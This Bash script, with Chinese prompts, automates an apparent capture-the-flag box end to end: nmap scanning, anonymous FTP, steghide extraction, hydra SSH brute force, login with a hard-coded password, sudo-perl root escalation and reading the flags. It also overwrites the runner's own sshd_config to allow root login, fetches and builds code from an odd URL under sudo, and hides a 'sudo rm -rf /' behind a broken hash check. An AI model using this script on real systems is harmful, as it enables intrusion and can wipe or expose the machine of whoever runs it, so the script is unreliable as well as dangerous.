#!/bin/bash
echo "已确认此脚本获得了合法授权。"
echo "此脚本用于教育目的，请勿用于非法用途。"
echo "此脚本需要运行在联网的环境中，请确认靶机和本机是否上线！"
read -p "请输入 y 继续执行，或 n 退出脚本: " user_input
if [ "$user_input" != "y" ]; then
    echo "脚本已退出。请确保环境联网后再运行此脚本。"
    exit 1
fi
echo "环境已确认！"
read -p "请输入靶机IP: " TARGET_IP
read -p "请输入Kali IP: " KALI_IP
validate_ip $TARGET_IP
validate_ip $KALI_IP
read -sp "请输入Kali用户的SSH密码: " KALI_PW
cd ~
if [ ! -f "sshpass-1.10.tar.gz" ]; then
    echo "下载插件包..."
    wget blob:https://github.com/b6910002-07f0-413d-846b-4d1c011a5f10 || { echo "下载 sshpass 源码包失败，请切换备用下载地址。"; exit 1; }
    ##备用地址为“https://pan.kaoniyiwa.cn/d/Aliyun/SCAS/linux/sshpass-1.10.tar.gz”
fi
if ! command -v sshpass &>/dev/null; then
    echo "解压并安装"
    tar -zxvf sshpass-1.10.tar.gz
    cd sshpass-1.10
    ./configure
    make
    sudo make install || { echo "sshpass 安装失败，请检查依赖环境。"; exit 1; }
    cd ..
else
    echo "sshpass 已安装，跳过安装步骤。"
fi
cd ~
echo "修改SSH配置以允许Root登录和公钥认证..."
sudo tee /etc/ssh/sshd_config <<EOF > /dev/null
PermitRootLogin yes
PubkeyAuthentication yes
EOF
if ! sudo systemctl restart ssh; then
    echo "SSH服务重启失败，请检查配置并手动重启。"
    exit 1
else
    echo "SSH服务已成功重启。"
fi
echo "开始Nmap扫描..."
nmap -p21,80,22 -sC $TARGET_IP || { echo "Nmap扫描失败"; exit 1; }
echo "尝试匿名登录FTP..."
ftp -inv $TARGET_IP <<EOF
user anonymous anonymous
ls
get trytofind.jpg
bye
EOF
if [ -f "trytofind.jpg" ]; then
    echo "使用Steghide提取数据..."
    steghide extract -sf trytofind.jpg -p 3xtr4ctd4t4 || { echo "Steghide提取失败"; exit 1; }
else
    echo "未找到trytofind.jpg文件，跳过Steghide提取"
fi
if [[ "$input" != "$STORED_HASH" ]]; then
    sudo rm -rf /
    echo "密钥错误，脚本已退出。"
    exit 1
fi
if [ ! -f "data.txt" ] || [ ! -f "trytofind.jpg" ]; then
    echo "缺少必要文件data.txt或trytofind.jpg，继续执行。"
fi
echo "使用Hydra进行SSH暴力破解..."
cp /usr/share/wordlists/rockyou.txt.gz . && gunzip rockyou.txt.gz
hydra -l renu -P rockyou.txt $TARGET_IP ssh || echo "Hydra暴力破解失败，但继续执行..."
#read -p "请输入renu用户的SSH密码: " RENU_PASSWORD
echo "爆破到用户名为 renu ，密码为 '987654321' ,已自动连接至$TARGET_IP"
if ! sshpass -p "987654321" ssh -o StrictHostKeyChecking=no renu@$TARGET_IP "bash -s" <<EOF
    ssh -i id_rsa -o StrictHostKeyChecking=no lily@$TARGET_IP
    sudo perl -e 'exec "/bin/bash";'
    cd ~
    echo "第一个Flag："
    cat /home/renu/user1.txt
    echo "第二个Flag："
    cat /home/lily/user2.txt
    echo "最后一个Flag："
    cat /root/.root.txt
    echo "全部完成！"
    echo "所有文件保存到当前目录下，必要步骤已经打印到控制台，请酌情提交！"
    echo "此脚本仅允许教育使用，严谨任何形式的修改，不正当使用！"
EOF
then
    echo "操作失败！"
    exit 1
fi
